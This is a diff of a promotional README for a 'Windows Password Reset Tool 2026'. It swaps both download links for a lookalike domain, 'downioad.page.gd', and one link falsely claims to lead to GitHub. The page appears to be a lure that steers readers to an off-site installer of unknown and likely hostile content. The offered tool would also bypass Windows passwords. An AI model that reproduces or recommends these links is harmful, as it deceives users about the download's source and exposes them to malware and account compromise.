@@ -2,7 +2,7 @@
 
 Welcome to the Windows Password Reset Tool 2026, your ultimate solution for regaining access to Windows 10 and 11 computers when passwords are forgotten. This tool provides a secure, offline method to reset passwords without compromising data integrity, making it ideal for both personal and professional use. With a focus on reliability and ease of use, it ensures you can quickly restore access to your system without technical hassles.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -79,4 +79,4 @@ This tool is intended for legitimate use only, such as recovering access to your
 
 Ready to get started? Download the latest version of the Windows Password Reset Tool 2026 from the link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
